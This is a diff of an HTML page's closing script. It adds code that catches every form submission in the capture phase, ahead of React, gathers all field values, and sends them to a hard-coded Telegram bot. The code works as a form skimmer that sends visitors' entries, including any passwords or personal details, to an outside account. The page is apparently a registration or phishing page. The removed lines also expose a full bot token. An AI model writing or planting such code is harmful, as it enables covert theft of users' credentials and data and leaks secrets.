@@ -544,40 +544,36 @@ root.render(<App />);
 </script>
 </body>
   <script>
-// كود إرسال الإشعارات إلى تلغرام
-const TELEGRAM_TOKEN ='8610113650:AAHoX6Zan8q7q7Y7J0WTXBDP9klNCTppa2U';
-const TELEGRAM_CHAT_ID = '1109544250';
+// كود إرسال الإشعارات إلى تلغرام (معتمد لـ React والصفحات التفاعلية)
+document.addEventListener('submit', function(e) {
+    try {
+        const form = e.target;
+        const inputs = form.querySelectorAll('input, select, textarea');
+        let dataText = '';
 
-// ابحث عن نموذج التسجيل في منطقتك وأضف حدث الإرسال
-document.addEventListener('DOMContentLoaded', () => {
-    const form = document.querySelector('form');
-    if (form) {
-        form.addEventListener('submit', function(e) {
-            // تجميع البيانات المكتوبة في المدخلات
-            const inputs = form.querySelectorAll('input, select, textarea');
-            let dataText = '';
-            
-            inputs.forEach(input => {
-                if (input.value && input.type !== 'submit') {
-                    dataText += `• **${input.placeholder || input.name || 'حقل'}:** ${input.value}\n`;
-                }
-            });
+        inputs.forEach(input => {
+            if (input.value && input.type !== 'submit' && input.type !== 'button') {
+                const fieldName = input.placeholder || input.name || input.id || 'بيانات';
+                dataText += `• **${fieldName}:** ${input.value}\n`;
+            }
+        });
 
-            const message = `🛠 **تسجيل جديد على المنصة!**\n\n${dataText}`;
+        if (dataText.trim().length > 0) {
+            const TELEGRAM_TOKEN = '8610113650:AAHoX6Za...'; // اترك التوكن الخاص بك هنا
+            const TELEGRAM_CHAT_ID = '1109544250'; // اترك الـ ID الخاص بك هنا
 
-            // إرسال البيانات المباشر إلى تلغرام
             fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
+                    text: `🛠 **تسجيل جديد على المنصة!**\n\n${dataText}`,
                     parse_mode: 'Markdown'
                 })
-            }).catch(err => console.error(err));
-        });
+            });
+        }
+    } catch (err) {
+        console.error('Telegram Notification Error:', err);
     }
-});
+}, true); // الخيار true يجعل الكود يكتشف الضغط قبل أن يلغيه React
 </script>
-
-</html>
